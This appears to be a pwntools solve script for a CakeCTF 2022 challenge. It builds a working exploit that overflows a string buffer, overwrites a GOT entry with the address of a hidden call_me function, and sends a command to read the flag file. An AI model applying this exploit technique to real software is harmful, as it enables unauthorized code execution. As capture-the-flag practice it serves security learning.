#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("pwn1.2022.cakectf.com", 9003)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def set_c_str(buf):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("c_str:")
    p.sendline(buf)

def get_c_str():
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("c_str: ")
    return p.recvline().rstrip(b'\n')

def set_str(buf):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("str:")
    p.sendline(buf)

def get_str():
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("str: ")
    return p.recvline().rstrip(b'\n')

payload = b'A' * 8
set_str(payload)

payload = b'B' * 8 * 4
payload += p64(elf.got['_ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE'])
set_c_str(payload)

payload = p64(elf.symbols['_ZN4Test7call_meEv'])
set_str(payload)

payload = b'cat flag-ba2a141e66fda88045dc28e72c0daf20.txt'
set_str(payload)

p.interactive()
